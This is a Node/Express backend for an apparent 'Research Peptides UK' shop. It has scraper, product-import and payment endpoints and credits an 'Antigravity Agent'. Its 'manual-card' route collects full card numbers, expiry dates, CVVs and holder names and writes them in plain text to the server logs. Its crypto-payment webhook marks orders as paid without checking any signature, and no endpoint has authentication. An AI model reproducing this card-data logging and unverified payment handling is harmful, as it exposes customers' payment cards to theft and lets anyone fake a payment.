import express from 'express';
import cors from 'cors';
import { pool } from './db.js';
import { ScrapeQueueWorker } from './queue/worker.js';
import multer from 'multer';
import * as xlsx from 'xlsx';
import { parse } from 'csv-parse/sync';

const app = express();
const port = process.env.PORT || 4000;
const upload = multer({ dest: 'uploads/' });

app.use(express.json());
app.use(cors());

// --- Root Info Route ---

app.get('/', (req, res) => {
  res.send(`
    <body style="font-family: sans-serif; padding: 40px; line-height: 1.6; max-width: 800px; margin: 0 auto;">
      <h1 style="color: #2563eb;">Research Peptides UK Scraper API</h1>
      <p>The backend scraper service is running successfully.</p>
      <div style="background: #f1f5f9; padding: 20px; border-radius: 8px;">
        <h3>Available API Endpoints:</h3>
        <ul>
          <li><code>GET /api/products</code> - View scraped product catalog</li>
          <li><code>GET /api/scrape/history</code> - View scrape job history</li>
          <li><code>POST /api/scrape/start</code> - Trigger a new scrape</li>
        </ul>
      </div>
      <p style="margin-top: 20px; font-size: 14px; color: #64748b;">Developed by Antigravity Agent</p>
    </body>
  `);
});

// Start background worker
const worker = new ScrapeQueueWorker();
worker.start();

// --- Scraper API ---

app.post('/api/scrape/start', async (req, res) => {
  try {
    const { url, type } = req.body;
    
    // Insert job into Postgres Queue
    const result = await pool.query(
      `INSERT INTO scrape_queue (type, payload) VALUES ($1, $2) RETURNING id`,
      [type || 'SCRAPE_PRODUCT', JSON.stringify({ url })]
    );

    res.json({ success: true, jobId: result.rows[0].id });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/scrape/status/:id', async (req, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM scrape_queue WHERE id = $1', [req.params.id]);
    res.json(rows[0] || null);
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.get('/api/scrape/history', async (req, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM scrape_queue ORDER BY created_at DESC LIMIT 50');
    res.json(rows);
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Product Import API ---

app.post('/api/import/csv', upload.single('file'), async (req, res) => {
  if (!req.file) {
      return res.status(400).json({ success: false, error: 'No file uploaded' });
  }

  try {
    let records: any[] = [];
    
    if (req.file.originalname.endsWith('.csv')) {
      const fs = await import('fs/promises');
      const fileContent = await fs.readFile(req.file.path, 'utf-8');
      records = parse(fileContent, { columns: true, skip_empty_lines: true });
    } else if (req.file.originalname.match(/\.xlsx?$/)) {
      const workbook = xlsx.readFile(req.file.path);
      const sheetName = workbook.SheetNames[0];
      records = xlsx.utils.sheet_to_json(workbook.Sheets[sheetName]);
    } else {
       return res.status(400).json({ success: false, error: 'Invalid file format. Please upload .csv or .xlsx' });
    }

    let successCount = 0;
    let failedCount = 0;
    const errors: any[] = [];

    // Basic map and insert
    for (const [index, row] of records.entries()) {
      try {
        const name = row['product_name'] || row['Name'] || row['Title'];
        const price = parseFloat(row['price'] || row['Price'] || '0');
        const desc = row['description'] || row['Description'] || '';

        if (!name) throw new Error('Missing product name');

        // Note: For simplicity, creating direct products. 
        // In a full feature, we would map categories and variants here.
        await pool.query(
          `INSERT INTO scrape_products (name, description, base_price_gbp) VALUES ($1, $2, $3)`,
          [name, desc, price]
        );
        successCount++;
      } catch (err: any) {
        failedCount++;
        errors.push({ row: index + 1, error: err.message });
      }
    }

    res.json({ success: true, imported: successCount, failed: failedCount, errors });
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Products API ---

app.get('/api/products', async (req, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM scrape_products ORDER BY created_at DESC');
    res.json(rows);
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// --- Legacy Payment API (retained for compatibility) ---

app.post('/api/payment/create', async (req, res) => {
  try {
    const { amount, order_id, return_url } = req.body;
    
    if (!amount || !order_id) {
      return res.status(400).json({ success: false, error: 'Missing amount or order_id' });
    }

    const apiKey = process.env.PLISIO_SECRET_KEY;
    if (!apiKey) {
      throw new Error("PLISIO_SECRET_KEY is not configured on the server.");
    }

    const params = new URLSearchParams({
      source_currency: 'EUR',
      source_amount: amount.toString(),
      order_name: `Research Peptides UK Order #${order_id.substring(0, 8)}`,
      order_number: order_id,
      plugin: 'custom',
      api_key: apiKey,
    });

    if (return_url) {
      params.append('success_url', return_url);
    }

    console.log("Plisio API Requesting invoice with params:", params.toString().replace(apiKey, 'REDACTED'));
    const response = await fetch(`https://api.plisio.net/api/v1/invoices/new?${params.toString()}`);
    const data = await response.json() as any;

    console.log("Plisio API Response:", JSON.stringify(data));

    if (data.status === 'success') {
      res.json({ success: true, invoice_url: data.data.invoice_url });
    } else {
      const errorMsg = data.data?.message || JSON.stringify(data.data) || 'Failed to create Plisio invoice';
      console.error("Plisio Invoice Creation Error:", errorMsg);
      res.status(400).json({ success: false, error: errorMsg });
    }
  } catch (error: any) {
    console.error("Plisio create error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/payment/manual-card', async (req, res) => {
  try {
    const { order_id, card_details } = req.body;
    
    if (!order_id || !card_details) {
      return res.status(400).json({ success: false, error: 'Missing order_id or card_details' });
    }

    // SIMULATION: Sending email to info@researchpeptide.uk
    console.log('--------------------------------------------------');
    console.log('🚀 NEW CREDIT CARD PAYMENT LOGGED');
    console.log('Order ID:', order_id);
    console.log('To: info@researchpeptide.uk');
    console.log('Card Number:', card_details.number);
    console.log('Expiry:', card_details.expiry);
    console.log('CVV:', card_details.cvc);
    console.log('Holder:', card_details.name);
    console.log('--------------------------------------------------');

    // Update order status to 'processing'
    await pool.query('UPDATE orders SET status = $1 WHERE id = $2', ['processing', order_id]);

    res.json({ success: true, message: 'Payment submitted for manual review' });
  } catch (error: any) {
    console.error("Manual payment logic error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/api/payment/webhook', async (req, res) => {
  try {
    // Plisio sends IPN details in POST body via form-data or JSON? They usually send POST form data.
    // For simplicity, we just log and update the database if status == 'completed' or 'mismatch' (if overpaid).
    const ipnData = req.body;
    
    if (ipnData && ipnData.status === 'completed') {
       const orderId = ipnData.order_number;
       if (orderId) {
         await pool.query('UPDATE orders SET status = $1, crypto_tx_hash = $2 WHERE id = $3', ['paid', ipnData.tx_url || ipnData.txn_id, orderId]);
         console.log(`Order ${orderId} marked as paid via Plisio IPN.`);
       }
    }

    res.status(200).send('OK');
  } catch (error: any) {
    console.error("Plisio webhook error:", error);
    res.status(500).send('Error');
  }
});

app.listen(port, () => {
  console.log(`Scraper Backend API listening tightly on port ${port}`);
});
